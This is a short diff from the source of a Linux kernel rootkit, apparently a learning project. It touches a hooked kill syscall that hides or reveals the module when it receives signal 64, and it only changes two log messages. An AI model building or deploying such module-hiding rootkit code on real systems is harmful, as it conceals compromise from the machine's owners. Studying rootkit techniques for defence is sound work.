@@ -34,13 +34,13 @@ asmlinkage int hook_kill(const struct pt_regs *regs)
 
 	if ( (sig == 64) && (hidden == 0) )
 	{
-		printk(KERN_INFO "Hiding rootkit kernel module...\n");
+		printk(KERN_INFO "rootkit: hiding rootkit kernel module...\n");
 		hideme();
 		hidden = 1;
 	}
 	else if ( (sig == 64) && (hidden == 1) )
 	{
-		printk(KERN_INFO "Revealing rootkit kernel module...\n");
+		printk(KERN_INFO "rootkit: revealing rootkit kernel module...\n");
 		showme();
 		hidden = 0;
 	}
